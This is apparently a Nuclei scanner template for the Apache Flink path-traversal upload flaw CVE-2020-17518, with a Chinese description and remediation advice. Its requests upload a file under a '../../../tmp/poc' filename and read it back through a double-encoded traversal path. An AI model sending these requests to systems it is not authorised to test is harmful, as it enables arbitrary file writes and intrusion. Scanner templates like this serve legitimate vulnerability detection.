id: CVE-2020-17518
info:
  name: Apache Flink Upload Path Traversal
  author:
  - pdteam
  description: |-
    Apache Flink 任意 Jar 包上传导致远程代码执行
    Apache Flink是一个用于分布式流和批处理数据的开放源码平台。Flink的核心是一个流数据流引擎，它为数据流上的分布式计算提供数据分发、通信和容错功能。Flink在流引擎之上构建批处理，覆盖本地迭代支持、托管内存和程序优化。近日有安全研究人员发现apache flink允许上传任意的jar包从而导致远程代码执行。
  severity: high
  remediation: |-
    **官方解决建议**

    建议用户关注Apache Flink官网，及时获取该漏洞最新补丁。

    **临时解决建议**

    设置IP白名单只允许信任的IP访问控制台并添加访问认证。
requests:
- raw:
  - |
    POST /jars/upload HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

    ------WebKitFormBoundaryoZ8meKnrrso89R6Y
    Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/poc"

    {{outputStr}}
    ------WebKitFormBoundaryoZ8meKnrrso89R6Y--
- matchers:
  - type: dsl
    dsl:
    - contains(body, "{{outputStr}}") && status_code == 200
  path:
  - '{{BaseURL}}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc'
  method: GET
variables:
  outputStr: '{{rand_text_alphanumeric(15,"")}}'
